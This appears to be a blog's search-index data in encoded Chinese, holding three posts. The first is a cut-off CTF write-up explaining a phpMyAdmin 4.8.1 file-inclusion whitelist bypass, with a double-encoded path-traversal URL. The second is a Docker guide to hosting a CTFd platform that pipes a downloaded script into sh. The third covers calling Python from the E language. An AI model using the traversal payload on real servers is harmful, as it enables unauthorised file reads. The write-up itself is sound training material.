&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x4E2D;&#xFF0C;&#x4ECE;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#xFF0C;&#x53D6;&#x5230;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x4F4D;&#x7F6E;&#x3002; $page, 0, mb_strpos($page . &apos;?&apos;, &apos;?&apos;) //mb_strpos &#x2014; &#x67E5;&#x627E;&#x5B57;&#x7B26;&#x4E32;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x9996;&#x6B21;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E; &#x5728;&#x8FD9;&#x91CC;&#x5B83;&#x5728;page&#x540E;&#x9762;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;? &#x5C31;&#x6B63;&#x597D;&#x5C06;&#x4ECE;&#x7B2C;&#x4E00;&#x4E2A;&#x95EE;&#x53F7;&#x5F00;&#x59CB;&#x628A;&#x540E;&#x9762;&#x53D6;&#x5B8C;&#x4E86;&#x3002; ); //&#x91CD;&#x70B9;&#x5728;&#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#xFF0C;&#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x4F1A;&#x5C06;&#x7B2C;&#x4E00;&#x4E2A;&#x95EE;&#x53F7;&#x4E4B;&#x540E;&#x7684;&#x5185;&#x5BB9;&#x90FD;&#x53D6;&#x51FA;&#x6765;&#x3002; //&#x5230;&#x6B64;&#x7684;page&#x4E3A;&#xFF1A;hint.php%3f../../../../../fuck.txt if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); //&#x5C06;file&#x7684;&#x503C;url&#x89E3;&#x7801; //&#x5230;&#x6B64;&#x7684;page&#x4E3A;&#xFF1A;hint.php?../../../../../fuck.txt $_page = mb_substr( //&#x518D;&#x53D6;&#x4E00;&#x904D;&#x95EE;&#x53F7;&#x4E4B;&#x540E;&#x7684;&#x5185;&#x5BB9; $_page, 0, mb_strpos($_page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&apos;t see it&quot;; return false; } } if (! empty($_REQUEST[&apos;file&apos;]) &amp;&amp; is_string($_REQUEST[&apos;file&apos;]) &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]) ) { include $_REQUEST[&apos;file&apos;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; &#x4ECE;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x6765;&#x770B;&#xFF0C;&#x8003;&#x7684;&#x662F;phpmyadmin 4.8.1&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x3002; &#x95EE;&#x9898;&#x51FA;&#x73B0;&#x5728;&#x4E0B;&#x9762;&#x8FD9;&#x6BB5;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#xFF0C;&#x5728;&#x6761;&#x4EF6;&#x90FD;&#x4E3A;&#x771F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5C31;&#x4F1A;&#x5305;&#x542B;&#x53C2;&#x6570;file&#x6240;&#x8D4B;&#x4E88;&#x7684;&#x5185;&#x5BB9;&#x3002; &#x5224;&#x65AD;&#x8BED;&#x53E5;&#x91CC;&#x4F7F;&#x7528;&#x4E86;emmm&#x7C7B;&#x7684;checkFile&#x65B9;&#x6CD5;&#x6765;&#x5224;&#x65AD;file&#x662F;&#x5426;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#xFF0C;&#x770B;&#x4E00;&#x4E0B;file&#x65B9;&#x6CD5;&#x91CC;&#x9762;&#x7684;&#x5224;&#x65AD;&#x3002;&#x5206;&#x6790;&#x5185;&#x5BB9;&#x5728;&#x6E90;&#x7801;&#x91CC;&#x3002; &#x4ECE;&#x5206;&#x6790;&#x7684;&#x5185;&#x5BB9;&#x6765;&#x770B;&#xFF0C;&#x6784;&#x9020;&#x7684;&#x94FE;&#x63A5;&#x8981;&#x6EE1;&#x8DB3;&#xFF1A; file&#x540E;&#x9762;&#x7684;&#x7F51;&#x9875;&#x5FC5;&#x987B;&#x5728;&#x767D;&#x540D;&#x5355;&#x5185; &#x904D;&#x5386;&#x524D;&#x9762;&#x7684;&#x95EE;&#x53F7;&#x8981;&#x7ECF;&#x8FC7;&#x4E24;&#x6B21;url&#x7F16;&#x7801; &#x6784;&#x9020;&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;http://222.18.158.226:50000/index.php?file=hint.php%253f/../../../../../ffffllllaaaagggg &#x8FDB;&#x5165;&#x5F97;&#x5230;flag","link":"/2018/01/01/phpmyadmin 4.8.1任意文件包含漏洞-CTF/"},{"title":"初探Docker之搭建CTF平台","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x817E;&#x8BAF;10&#x5143;&#x5B66;&#x751F;&#x673A; &#x8D2D;&#x4E70;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x963F;&#x91CC;&#x4E91;&#x7684;&#x5B66;&#x751F;&#x673A;&#xFF0C;&#x90FD;&#x5F88;&#x4FBF;&#x5B9C;&#x3002; &#x8FD9;&#x91CC;&#x6211;&#x9009;&#x62E9;&#x4E86;Ubuntu&#x7CFB;&#x7EDF;&#x3002; &#x5B89;&#x88C5;Docker + Docker-compose &#x5B89;&#x88C5;Docker&#xFF1A; &#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x8FD9;&#x4E2A;&#xFF1A;Ubuntu Docker &#x5B89;&#x88C5; &#x5B89;&#x88C5;&#x6700;&#x65B0;&#x7684;docker wget -qO- https://get.docker.com/ | sh &#x5B89;&#x88C5;&#x5B8C;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x63D0;&#x793A;&#xFF0C;&#x6309;&#x7167;&#x63D0;&#x793A;&#x53BB;&#x6267;&#x884C; sudo usermod -aG docker ubuntu &#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C; docker verison &#x6765;&#x67E5;&#x770B;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x3002; &#x5B89;&#x88C5;Docker-compose&#xFF1A; &#x53C2;&#x8003;&#xFF1A;https://github.com/docker/compose/releases &#x56E0;&#x4E3A;&#x6211;&#x7684;&#x817E;&#x8BAF;&#x4E91;&#x4E0D;&#x662F;root&#x6743;&#x9650;&#xFF0C;&#x5728;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x524D;&#x8981;&#x52A0;sudo sudo curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose &#x540C;&#x6837;&#x7684;&#xFF0C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C; docker-compose verison &#x6765;&#x67E5;&#x770B;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x3002; &#x642D;&#x5EFA;CTF&#x5E73;&#x53F0;&#x76F4;&#x63A5;&#x7528;github&#x4E0A;&#x5DF2;&#x7ECF;&#x96C6;&#x6210;&#x7684;&#x5E73;&#x53F0;ctfd&#x6765;&#x642D;&#x5EFA;&#x3002; &#x5730;&#x5740;&#xFF1A;https://github.com/CTFd/CTFd &#x4E0B;&#x8F7D;&#x9879;&#x76EE;&#xFF1A; git clone https://github.com/CTFd/CTFd.git cd CTFd &#x8FD0;&#x884C;&#x5B89;&#x88C5;&#xFF1A; docker-compose up -d &#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x8981;&#x5728;CTFd&#x76EE;&#x5F55;&#x4E2D;&#x6267;&#x884C; &#x7B2C;&#x4E00;&#x6B21;&#x8FD0;&#x884C;&#x5C31;&#x6BD4;&#x8F83;&#x6162;&#xFF0C;&#x4F1A;&#x4E0B;&#x8F7D;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002;(&#x53EF;&#x80FD;&#x4F1A;&#x7B49;&#x5F88;&#x4E45;&#xFF0C;&#x5B9E;&#x5728;&#x7B49;&#x4E0D;&#x4E0B;&#x53BB;&#x4E86;&#x5C31;&#x5148;&#x9000;&#x51FA;&#xFF0C;&#x8FDB;&#x5165;CTFd&#x6587;&#x4EF6;&#x5939;&#x53C8;&#x53EF;&#x4EE5;docker-compose up -d &#x7EE7;&#x7EED;) &#x4E0B;&#x9762;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5C31;&#x662F;&#x5B89;&#x88C5;&#x597D;&#x4E86;&#xFF1A; &#x4F7F;&#x7528;&#x547D;&#x4EE4; docker-compose ps&#x67E5;&#x770B;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668; &#x8FD9;&#x65F6;&#x5019;&#x5C31;&#x53EF;&#x4EE5;&#x53BB;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;ip&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x8BB0;&#x5F97;&#x52A0;&#x4E0A;&#x7AEF;&#x53E3;&#x53F7;8000&#x3002;&#x6BD4;&#x5982;&#xFF1A;http://ip:8000/ &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5E73;&#x53F0;&#x5DF2;&#x7ECF;&#x642D;&#x5EFA;&#x6210;&#x529F;&#x4E86;&#x3002; &#x5982;&#x679C;&#x4F60;&#x60F3;&#x505C;&#x6B62;&#x8FD0;&#x884C;&#x5E73;&#x53F0;&#x7684;&#x8BDD;&#xFF0C;&#x5728;CTFd&#x76EE;&#x5F55;&#x4E0B;&#x6267;&#x884C; docker-compose stop&#x5373;&#x53EF;&#x3002; &#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#xFF1A;docker-compose up -d &#x642D;&#x5EFA;ctf&#x9898;&#x76EE;&#x73AF;&#x5883;&#x7528;docker&#x6765;&#x642D;&#x5EFA;ctf&#x9898;&#x76EE;&#x73AF;&#x5883; &#x8FD9;&#x91CC;&#x53EA;&#x5C1D;&#x8BD5;&#x642D;&#x5EFA;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;ctf&#x9898;&#x76EE;&#x73AF;&#x5883;&#x3002; &#x53BB;&#x7F51;&#x6613;&#x955C;&#x50CF;&#x4E2D;&#x5FC3;&#x5BFB;&#x627E;&#x4E00;&#x4E2A;&#x5408;&#x9002;&#x7684;&#x955C;&#x50CF;&#xFF1A;https://c.163yun.com/hub &#x8FD9;&#x91CC;&#x6211;&#x9009;&#x62E9;&#x4E86; public /LAMP &#x955C;&#x50CF;&#x3002; &#x4E0B;&#x8F7D;&#x955C;&#x50CF;&#xFF1A; docker pull hub.c.163.com/public/lamp:latest &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;docker images&#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x4E0B;&#x8F7D;&#x7684;&#x955C;&#x50CF; &#x8FD0;&#x884C;&#x955C;&#x50CF;&#xFF0C;&#x7ED1;&#x5B9A;&#x7AEF;&#x53E3;&#xFF1A; docker run -d -p 3333:80 hub.c.163.com/public/lamp &#x7AEF;&#x53E3;&#x662F;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x66F4;&#x6539;&#x7684;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x5B9A;&#x4E86;3333&#x7AEF;&#x53E3;&#x3002;(&#x8BB0;&#x5F97;&#x53BB;&#x670D;&#x52A1;&#x5668;&#x5546;&#x90A3;&#x8BBE;&#x7F6E;&#x5B89;&#x5168;&#x7EC4;&#xFF0C;&#x4E0D;&#x7136;3333&#x7AEF;&#x53E3;&#x662F;&#x8BBF;&#x95EE;&#x4E0D;&#x4E86;&#x7684;) &#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E32;&#x968F;&#x673A;&#x5B57;&#x7B26;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BB9;&#x5668;&#x7684;ID&#x3002; &#x8FD9;&#x65F6;&#x53EF;&#x4EE5;&#x7528;docker ps&#x67E5;&#x770B;&#x6B63;&#x5219;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668; &#x590D;&#x5236;&#x6587;&#x4EF6;&#x5230;&#x5BB9;&#x5668;&#x5185;&#xFF1A; docker cp ./index.php 321780737d:/var/www/ &#x53EA;&#x9700;&#x53D6;&#x5BB9;&#x5668;ID&#x524D;&#x9762;&#x90E8;&#x5206;&#x5373;&#x53EF; &#x8FDB;&#x5165;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x67E5;&#x770B;&#xFF1A; docker exec -it 321780737d bash &#x4ECE;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;&#xFF1A;http://ip:3333/ &#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5DF2;&#x7ECF;&#x90E8;&#x7F72;&#x6210;&#x529F;&#x4E86;&#x3002; &#x5C31;&#x53EF;&#x4EE5;&#x628A;&#x9898;&#x76EE;&#x94FE;&#x63A5;&#x6302;&#x5230;CTF&#x5E73;&#x53F0;&#x4E0A;&#x9762;&#x4E86;&#x3002; &#x603B;&#x7ED3;docker&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5185;&#x5BB9;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x5230;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x662F;&#x5229;&#x7528;docker&#x548C;docker-compose&#x642D;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x9898;&#x76EE;&#x73AF;&#x5883;&#x3002; &#x540E;&#x9762;&#x7B49;&#x7528;&#x5230;&#x518D;&#x7EE7;&#x7EED;&#x6DF1;&#x5165;&#x5B66;&#x4E60;docker&#x3002; &#x53C2;&#x8003; http://blog.5am3.com/2017/12/08/SCodeCTF/ https://www.imooc.com/learn/867","link":"/2019/06/06/初探Docker之搭建CTF平台/"},{"title":"关于易语言与Python的一点想法","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x6700;&#x8FD1;&#x5403;&#x996D;&#x7684;&#x65F6;&#x5019;&#x603B;&#x662F;&#x4F1A;&#x60F3;&#x5F88;&#x591A;&#x5173;&#x4E8E;&#x6613;&#x8BED;&#x8A00;&#x7684;&#x4E8B;&#x60C5;&#x3002;&#x6613;&#x8BED;&#x8A00;&#x662F;&#x6211;&#x5B66;&#x4F1A;&#x7684;&#x7B2C;&#x4E00;&#x95E8;&#x8BED;&#x8A00;&#xFF0C;&#x867D;&#x7136;&#x5B83;&#x88AB;&#x55B7;&#x7684;&#x5F88;&#x60E8;&#x5F88;&#x60E8;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x89C1;&#xFF1A;&#x6613;&#x8BED;&#x8A00; &#x77E5;&#x4E4E;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5B83;&#x6781;&#x9AD8;&#x7684;&#x4E0A;&#x624B;&#x6027;&#xFF0C;&#x8FD8;&#x662F;&#x6210;&#x4E3A;&#x6211;&#x9AD8;&#x4E2D;&#x65F6;&#x671F;&#x6700;&#x559C;&#x6B22;&#x7684;&#x7F16;&#x7A0B;&#x5DE5;&#x5177;&#x3002;(&#x5F53;&#x65F6;&#x6211;&#x8FD8;&#x6CA1;&#x542C;&#x8BF4;&#x8FC7;Python)&#x6613;&#x8BED;&#x8A00;&#x753B;&#x754C;&#x9762;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#xFF0C;&#x7528;&#x9F20;&#x6807;&#x62D6;&#x52A8;&#x4E00;&#x4E0B;&#x7EC4;&#x4EF6;&#xFF0C;&#x7B80;&#x7B80;&#x5355;&#x5355;&#x7684;&#x51E0;&#x53E5;&#x4EE3;&#x7801;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;GUI&#x7A0B;&#x5E8F;&#x3002;&#x6211;&#x60F3;&#xFF0C;&#x5728;&#x754C;&#x9762;&#x5316;&#x7684;&#x7A0B;&#x5E8F;&#x4E0A;&#xFF0C;&#x9664;&#x4E86;Web&#x7A0B;&#x5E8F;&#x4E0A;&#x7528;Javascript&#x548C;CSS&#x753B;&#x754C;&#x9762;&#x3002;&#x5BF9;&#x4E8E;&#x6211;&#x8FD9;&#x6837;&#x61D2;&#x60F0;&#x7684;&#x4EBA;&#xFF0C;&#x6613;&#x8BED;&#x8A00;&#x65E0;&#x975E;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x9009;&#x62E9;&#x3002;Python&#xFF0C;&#x719F;&#x6089;&#x6613;&#x8BED;&#x8A00;&#x7684;&#x6211;&#x5728;&#x521A;&#x5B66;Python&#x65F6;&#x6781;&#x5EA6;&#x4E0D;&#x9002;&#x5E94;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5B66;&#x4E60;&#x4E86;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x5C31;&#x6539;&#x53D8;&#x4E86;&#x6211;&#x7684;&#x60F3;&#x6CD5;&#xFF0C;Python&#x771F;&#x7684;&#x592A;&#x8212;&#x670D;&#x4E86;&#x2026;&#x4E0D;&#x8BF4;&#x5F97;&#x592A;&#x8FDC;&#x4E86;&#xFF0C;&#x5148;&#x8BF4;&#x4E0B;&#x6211;&#x6700;&#x8FD1;&#x7684;&#x60F3;&#x6CD5;(&#x7591;&#x95EE;)&#xFF1A; &#x6613;&#x8BED;&#x8A00;&#x80FD;&#x548C;Python&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x5417;&#xFF1F; &#x7ED3;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x5E94;&#x8BE5;&#x662F;&#x600E;&#x6837;&#x7684;&#xFF1F; &#x7ED3;&#x5408;&#x8D77;&#x6765;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#xFF1F; &#x5728;&#x81EA;&#x95EE;&#x81EA;&#x7B54;&#x4E0A;&#x9762;&#x7684;&#x95EE;&#x9898;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x6765;&#x770B;&#x4E00;&#x770B;&#x6613;&#x8BED;&#x8A00;&#x4E0E;Python&#x6709;&#x4EC0;&#x4E48;&#x4E0D;&#x540C;&#x70B9;&#xFF1A; &#x6613;&#x8BED;&#x8A00;&#x4E0E;Python&#x7684;&#x4E0D;&#x540C;&#x5148;&#x6765;&#x770B;&#x770B;&#x6613;&#x8BED;&#x8A00;&#x4E0E;Python&#x7F16;&#x7A0B;&#x73AF;&#x5883;&#x7684;&#x4E0D;&#x540C;&#xFF1A; &#x6613;&#x8BED;&#x8A00;&#xFF1A; &#x6613;&#x8BED;&#x8A00;&#x8FD9;&#x4E2A;&#x5F39;&#x51FA;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6211;&#x53EA;&#x5199;&#x4E86;&#x4E00;&#x884C;&#x4EE3;&#x7801;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x53EA;&#x662F;&#x7EC4;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#x548C;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x4E9B;&#x6613;&#x8BED;&#x8A00;&#x90FD;&#x5DF2;&#x7ECF;&#x5B89;&#x6392;&#x597D;&#x4E86;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x53C2;&#x6570;&#x5373;&#x53EF;&#x3002; &#x90A3;&#x7528;Python&#x5199;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x5F39;&#x51FA;&#x8F93;&#x5165;&#x6846;&#x7684;&#x7A0B;&#x5E8F;&#x9700;&#x8981;&#x591A;&#x5C11;&#x884C;&#x4EE3;&#x7801;&#x5462;&#xFF1F; Python&#xFF1A; GUI&#x7F16;&#x7A0B;&#x4E0A;&#x624B;&#x5E76;&#x4E0D;&#x5BB9;&#x6613;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4EE5;&#x4E0B;&#x4E24;&#x7BC7;&#xFF1A; Python - &#x7F16;&#x5199;&#x53EF;&#x89C6;&#x5316;&#x754C;&#x9762;&#xFF08;Python+PyCharm+PyQt&#xFF09; Python GUI: PyCahrm&#x7ED3;&#x5408;Pyqt5&#x5F00;&#x53D1;&#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762; &#x8BE6;&#x7EC6;&#x6B65;&#x9AA4; &#x8E29;&#x5751;! &#x53EF;&#x89C1;Python&#x76F4;&#x63A5;&#x5199;&#x754C;&#x9762;&#xFF0C;&#x6BD4;&#x8D77;&#x8BED;&#x8A00;&#x8FD8;&#x662F;&#x8981;&#x591A;&#x5F88;&#x591A;&#x4EE3;&#x7801;&#x91CF;&#x7684;&#x3002;(&#x800C;&#x4E14;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#x8981;&#x8E29;&#x5F88;&#x591A;&#x5751;)&#x6211;&#x6BD4;&#x8F83;&#x70E6;&#x7684;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x90FD;&#x5F97;&#x6709;&#x4E00;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x8BDD;&#xFF0C;&#x5B9E;&#x5728;&#x592A;&#x9EBB;&#x70E6;&#x4E86;&#x3002;(&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x61D2;&#x5F97;&#x5B66;&#xFF1F;) &#x5F53;&#x7136;&#xFF0C;&#x6613;&#x8BED;&#x8A00;&#x9664;&#x4E86;&#x754C;&#x9762;&#x4EE5;&#x5916;&#x548C;Python&#x76F8;&#x6BD4;&#x8D77;&#x6765;&#x6709;&#x5F88;&#x591A;&#x7684;&#x7F3A;&#x70B9;&#xFF0C;&#x800C;Python&#x505A;&#x754C;&#x9762;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x5374;&#x5728;&#x5176;&#x4ED6;&#x65B9;&#x9762;&#x6BD4;&#x6613;&#x8BED;&#x8A00;&#x7A33;&#x5B9A;&#x9AD8;&#x6548;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x6211;&#x60F3;&#x603B;&#x7ED3;&#x6613;&#x8BED;&#x8A00;&#x4E0E;Python&#x7ED3;&#x5408;&#x65B9;&#x5F0F;&#x7684;&#x4E00;&#x4E2A;&#x539F;&#x56E0;&#x3002;&#x90A3;&#x6709;&#x6CA1;&#x6709;&#x65B9;&#x5F0F;&#x628A;&#x8FD9;&#x4E24;&#x90E8;&#x5206;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6613;&#x8BED;&#x8A00;&#x505A;&#x754C;&#x9762;&#x90E8;&#x5206;&#xFF0C;Python&#x505A;&#x529F;&#x80FD;&#x90E8;&#x5206;&#x53C8;&#x4F1A;&#x600E;&#x4E48;&#x6837;&#x5462;&#xFF1F; &#x56DE;&#x5230;&#x4E0A;&#x9762;&#x7684;&#x95EE;&#x9898;&#x3002; &#x6613;&#x8BED;&#x8A00;&#x80FD;&#x548C;Python&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x5417;&#xFF1F;&#x53EF;&#x4EE5;&#xFF01; &#x7ED3;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x5E94;&#x8BE5;&#x662F;&#x600E;&#x6837;&#x7684;&#xFF1F;1. &#x76F4;&#x63A5;&#x7528;DOS&#x8C03;&#x7528;&#x53D6;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x9700;&#x8981;&#x7528;&#x5230;&#x7CBE;&#x6613;&#x6A21;&#x5757;-&gt;&#x7CFB;&#x7EDF;_&#x53D6;DOS&#x8FD0;&#x884C;&#x7ED3;&#x679C;() &#x7CFB;&#x7EDF;_&#x53D6;DOS&#x6267;&#x884C;&#x7ED3;&#x679C; (&#x201C;python &#x201D; &#xFF0B; &#x53D6;&#x8FD0;&#x884C;&#x76EE;&#x5F55; () &#xFF0B; &#x201C;\\test.py&#x201D;) test.py&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF1A; print(&quot;Hello World.&quot;) &#x8FD0;&#x884C;&#x4F1A;&#x8FD4;&#x56DE;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x4E4B;&#x540E;&#x5728;&#x6613;&#x8BED;&#x8A00;&#x5F53;&#x4E2D;&#x5BF9;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x4E0B;&#x4E00;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x3002; &#x5982;&#x56FE;&#xFF1A; &#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x662F;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4E5F;&#x662F;&#x6700;&#x7B80;&#x5355;&#x7684;&#xFF0C;&#x5728;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x7684;&#x547D;&#x4EE4;&#x8F93;&#x5165;&#xFF0C;&#x5355;&#x4E00;&#x5185;&#x5BB9;&#x8FD4;&#x56DE;&#x7684;&#x811A;&#x672C;&#x4E2D;&#x6BD4;&#x8F83;&#x9002;&#x7528;&#x3002; &#x53C2;&#x8003;&#xFF1A; &#x5982;&#x4F55;&#x7528;&#x6613;&#x8BED;&#x8A00;&#x8C03;&#x7528;CMD &#x8FD0;&#x884C; python 2. &#x76F4;&#x63A5;&#x5728;&#x6613;&#x8BED;&#x8A00;&#x5F53;&#x4E2D;&#x6267;&#x884C;Python&#x8BED;&#x53E5;&#x611F;&#x8C22;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x5206;&#x4EAB;&#xFF0C;&#x524D;&#x8005;&#x8FD8;&#x76F4;&#x63A5;&#x5C06;&#x529F;&#x80FD;&#x5199;&#x6210;&#x4E86;&#x6A21;&#x5757;&#x6765;&#x7B80;&#x5316;&#x8C03;&#x7528;&#x3002; &#x6211;&#x89C9;&#x5F97;&#x76F4;&#x63A5;&#x8C03;&#x7528;Python&#x7684;API&#x8FD9;&#x4E2A;&#x65B9;&#x5F0F;&#x86EE;&#x6709;&#x610F;&#x601D;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x6BD4;&#x8F83;&#x9E21;&#x808B;&#x3002; &#x6211;&#x5C1D;&#x8BD5;&#x4E86;&#x7B80;&#x5355;&#x7684;python&#x8BED;&#x53E5;&#xFF0C;&#x5982;&#x7B80;&#x5355;&#x7684;&#x5FAA;&#x73AF;&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x5E76;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x6211;&#x4F7F;&#x7528;&#x7A0D;&#x5FAE;&#x590D;&#x6742;&#x4E00;&#x70B9;&#x7684;&#x547D;&#x4EE4;&#x5982;requests&#x83B7;&#x53D6;&#x7F51;&#x9875;&#x6E90;&#x7801;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x4E0D;&#x8FD4;&#x56DE;&#x5185;&#x5BB9;&#x4E86;&#x3002; &#x7B80;&#x5355;&#x7684;&#x547D;&#x4EE4;&#x5728;&#x6613;&#x8BED;&#x8A00;&#x5F53;&#x4E2D;&#x5C31;&#x80FD;&#x505A;&#x5230;&#xFF0C;&#x53C8;&#x4E3A;&#x4F55;&#x7528;&#x5230;python&#x5462;&#x3002; &#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x4E5F;&#x53EA;&#x80FD;&#x4F5C;&#x4E3A;&#x6613;&#x8BED;&#x8A00;&#x548C;Python&#x7ED3;&#x5408;&#x7684;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x5427;&#x3002;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x5B9E;&#x7528;&#x6027;&#x592A;&#x4F4E;&#x4E86;&#x3002; &#x4F8B;&#x5B50;&#xFF1A; &#x53C2;&#x8003;&#xFF1A; &#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;https://github.com/yingshaoxo/E_Python &#x8FD8;&#x6709;&#x539F;&#x7BC7;&#x5E16;&#x5B50;&#xFF1A;https://bbs.125.la/forum.php?mod=viewthread&amp;tid=14359854 3. Python&#x8C03;&#x7528;&#x6613;&#x8BED;&#x8A00;&#x7684;&#x51FD;&#x6570;&#x53C2;&#x8003;&#x5730;&#x5740;&#xFF1A;https://bbs.125.la/forum.php?mod=viewthread&amp;tid=14140784 &#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x9700;&#x8981;32&#x4F4D;&#x7684;Python&#xFF0C;&#x73AF;&#x5883;&#x642D;&#x5EFA;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#x5C31;&#x4E0D;&#x6F14;&#x793A;&#x4E86;&#x3002; 